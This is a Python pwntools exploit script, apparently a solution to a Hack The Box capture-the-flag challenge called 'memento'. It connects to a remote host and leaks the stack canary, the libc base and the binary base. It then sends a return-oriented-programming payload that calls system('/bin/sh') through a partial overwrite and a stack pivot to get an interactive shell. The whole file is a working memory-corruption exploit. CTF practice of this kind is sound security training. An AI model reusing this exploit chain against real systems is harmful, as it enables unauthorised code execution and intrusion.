#!/usr/bin/python3

from pwn import *
import os

exe = ELF("memento", checksec=False)
# libc = ELF("./libc.so.6", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARN"
context.endian == 'little'
isDebug = False

# brva 0x00000000000014D4 before calling loop() in main function

gs = '''
break loop
break remember
break reset
break recall
brva 0x0000000000001248
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)

def printMsg(msg):
	if isDebug:
		print(msg)

def remember(input1:bytes, input2:bytes):
	io.send(b"A")
	io.send(input1)
	io.send(input2)
	
def recall():
	io.send(b"B")
	result = io.recv()
	return result

def reset():
	io.send(b"C")

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================


######## REMOTE ########
connections = "94.237.51.177:34162"
io = remote(connections.split(":")[0], int(connections.split(":")[1]))
io.timeout = 4

# # access loop function when running local:
# io.send(b"HTB{}")
remember(p8(0xff), p8(0xff)*0xff)
leak = recall()

# leak stackBuffer address
stack_buffer = u64(leak[32:40]) - 0x19

# if stack_buffer & 0xff < 0x48 or stack_buffer & 0xff > 0xd0:
# 	print("stackBuffer is placed to close to 0x48. Bailing out.")
# 	print(f"{hex(stack_buffer)=}")
# 	exit()

# leak canary
canary = leak[40:48]

# leak libc base
ret_address_and_libc = leak[56:64]
libc_base = u64(ret_address_and_libc) - 0x2a1ca

libc_dir = "./libcs2"
libcs = []
for file_name in os.listdir(libc_dir):
	# Create the full path to the file
	full_path = os.path.join(libc_dir, file_name)
	
	# Check if it's a regular file (not a directory)
	if os.path.isfile(full_path) and full_path.endswith(".so"):
		# Load the file as an ELF object and append to the array
		lib = ELF(full_path, checksec=False)
		lib.address = libc_base
		libcs.append(lib)

libc = libcs[0] # number 5 spews alot of text...
rop_libc = ROP(libc)

# leak binary
binary_leak = u64(leak[88:96]) 
binary_base = binary_leak - 0x13b0 
_io_2_1_stdin_ = libc.symbols._IO_2_1_stdin_
_io_2_1_stdout_ = libc.symbols._IO_2_1_stdout_
_io_2_1_stderr_ = libc.symbols._IO_2_1_stderr_
exe.address = binary_base

print(f"{hex(stack_buffer)=}")
print(f"{hex(u64(canary))=}")
print(f"{hex(u64(ret_address_and_libc))=}")
print(f"{hex(_io_2_1_stdin_)=}")
print(f"{hex(_io_2_1_stdout_)=}")
print(f"{hex(_io_2_1_stderr_)=}")
print(f"{hex(libc_base)=}")
print(f"{hex(binary_leak)=}")
print(f"{hex(binary_base)=}")

# exploit...
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_address = pop_rdi + 1
system = libc.symbols.system
execve = libc.symbols.execve
dup2 = libc.symbols.dup2
exit_syscall = libc.sym['exit']
bin_sh = next(libc.search(b'/bin/sh\0'))
pop_rsp = rop_libc.find_gadget(['pop rsp', 'ret'])[0]
pop_rsi = rop_libc.find_gadget(['pop rsi', 'ret'])[0]


binary_ret = binary_base + 0x000000000000101a

print(f"{hex(pop_rdi)=}")
print(f"{hex(system)=}")
print(f"{hex(execve)=}")
print(f"{hex(dup2)=}")
print(f"{hex(bin_sh)=}")
print(f"{hex(pop_rsp)=}")
print(f"{hex(pop_rsi)=}")

rop_write_start_lsb = ((stack_buffer - 0x28) & 0xff) - 0x1
jump_overwrite_lsb = ((stack_buffer - 0x48) & 0xff) - 0x1
start_of_rop_address = stack_buffer - 0x28

over_write_start_print = stack_buffer - 0x28
jump_overwrite_print = stack_buffer - 0x48
start_of_rop_print = stack_buffer - 0x28

print(f"{hex(over_write_start_print)=}")
print(f"{hex(jump_overwrite_print)=}")
print(f"{hex(start_of_rop_print)=}")


if jump_overwrite_lsb + 0x10 > 0xf0:
	print("Bailing out because this is stupid!")
	print(f"{hex(jump_overwrite_lsb)=}")
	exit()

reset()
remember(p8(0x80), p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(0x0) + p8(jump_overwrite_lsb) + p64(pop_rsp) + p64(stack_buffer) + p8(0x11) * 79)
io.interactive()